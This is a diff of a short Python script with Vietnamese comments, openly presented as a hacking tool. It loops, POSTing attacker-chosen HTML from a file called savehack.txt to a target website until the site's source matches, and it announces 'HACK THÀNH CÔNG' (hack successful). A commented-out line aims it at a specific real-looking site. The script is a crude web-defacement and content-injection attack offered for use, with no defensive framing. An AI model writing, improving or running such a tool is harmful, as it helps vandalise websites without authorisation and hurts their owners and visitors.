@@ -1,49 +1,38 @@
 import requests
 import time
-import sys
 import os
 
-def main():
-    if len(sys.argv) < 2:
-        print("Ban chua nhap link web!")
-        return
+def load_payload():
+    with open("savehack.txt", "r", encoding="utf-8") as f:
+        return f.read()
 
-    target = sys.argv[1]
-    os.system('clear')
-    print(f"--- DANG QUAN LY WEB: {target} ---")
-
-    # BƯỚC 1: Bạn muốn thay đổi cái gì?
-    print("\n[!] Nhap noi dung HTML/CSS ban muon 'TIEM' vao:")
-    print("(Vi du: <h1 style='color:red;'>HI</h1>)")
-    payload = input("=> Noi dung: ")
-
-    print("\n[*] Bat dau tan cong va kiem tra tuyet doi...")
+def run_attack(target_url):
+    # Lấy nội dung bạn đã sửa trong savehack.txt
+    my_code = load_payload()
+    
+    print(f"[*] Đang thực hiện tiêm toàn bộ nội dung từ savehack.txt...")
     
     while True:
         try:
-            # BƯỚC 2: Gui ma cua ban len web
-            requests.post(target, data={'content': payload}, timeout=5)
-            
-            # BƯỚC 3: SAO CHEP TOAN BO ma nguon web ve de SO SANH
-            # Day la cho ban can: Kiem tra xem web co thuc su thay doi khong
-            check_web = requests.get(target, timeout=5)
-            ma_nguon_hien_tai = check_web.text
+            # 1. Tấn công tiêm code
+            # Giả sử tool gửi POST để ghi đè hoặc chèn vào file index
+            requests.post(target_url, data={'content': my_code}, timeout=5)
 
-            # BƯỚC 4: SO SANH TUYET DOI
-            if payload in ma_nguon_hien_tai:
-                print("\n[✓] THANH CONG!")
-                print(f"[i] Ma nguon web da khớp hoan toan voi ma ban nhap.")
-                print(f"[i] Noi dung '{payload}' da xuat hien.")
-                break # Dung lai vi da thanh cong
+            # 2. Lấy code thực tế hiện tại của Web để so sánh
+            current_web_code = requests.get(target_url, timeout=5).text
+
+            # 3. SO SÁNH TUYỆT ĐỐI
+            if my_code.strip() == current_web_code.strip():
+                print("\n[██████████] 100% - HACK THÀNH CÔNG!")
+                print("[✓] Web mục tiêu hiện đã giống hệt file savehack.txt của bạn.")
+                break
             else:
-                # Neu chua giong, no se bao dang cho va gui lai
-                print("[...] Dang doi web cap nhat... (Chua giong ma ban nhap)", end='\r')
-            
-            time.sleep(2) # Nghi 2 giay roi thu lai
-        except:
-            print("[!] Loi ket noi! Dang thu lai...")
-            time.sleep(3)
+                print("[!] Code vẫn chưa khớp. Đang tiếp tục đẩy dữ liệu...", end='\r')
+                
+            time.sleep(1) # Nghỉ để tránh lag máy
+        except Exception as e:
+            print(f"[!] Lỗi kết nối: {e}. Đang thử lại...")
+            time.sleep(2)
 
-if __name__ == "__main__":
-    main()
-    
+# Chạy tool
+# run_attack("https://robuxviet.com")
